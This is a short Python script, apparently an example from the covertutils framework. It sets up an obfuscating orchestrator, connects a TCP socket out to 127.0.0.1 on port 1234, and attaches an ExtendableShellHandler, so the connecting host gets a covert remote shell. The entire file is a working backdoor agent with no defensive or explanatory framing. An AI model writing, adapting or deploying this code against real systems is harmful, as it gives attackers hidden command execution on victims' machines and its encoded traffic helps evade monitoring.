from covertutils.orchestration import SimpleOrchestrator

orch_obj = SimpleOrchestrator(
        "Our passphrase can be anything! &^&%{}",
        out_length = 20,
        in_length = 20,
        )

import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",1234))

def send( data ) :
        s.send( data )

def recv() :
        return s.recv(20)     # This will automatically block as socket.recv() is a blocking method

from covertutils.handlers.impl import ExtendableShellHandler

ext_handler_obj = ExtendableShellHandler(recv, send, orch_obj)

from time import sleep

while True : sleep(10)
